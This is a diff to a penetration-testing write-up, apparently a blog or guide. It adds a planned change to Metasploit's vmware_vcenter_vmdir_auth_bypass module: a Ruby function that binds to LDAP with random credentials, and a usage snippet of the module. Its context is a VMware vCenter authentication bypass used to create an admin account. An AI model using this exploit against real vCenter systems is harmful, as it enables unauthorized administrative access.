@@ -79,6 +79,22 @@ account with Metasploit's `auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass
 
 At the moment of writing the module needs to be adjusted with ... TODO: reference to the pull request .... 
 
+TO BE UPDATED SOON ... I'm about to submit a pull request to metasploit until tomorrow, that will change the below function in `vmware_vcenter_vmdir_auth_bypass`
+
+```
+  def auth_bypass(ldap)
+    unless datastore['BIND_DN']
+      ldap.bind(
+        method: :simple,
+        username: Rex::Text.rand_text_alphanumeric(8..42),
+        password: Rex::Text.rand_text_alphanumeric(8..42)
+      )
+    end
+  end
+```
+After that modification an authenticated `vmware_vcenter_vmdir_auth_bypass` will work.
+
+
 Fill in your options and execute:
 ```
 msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > options
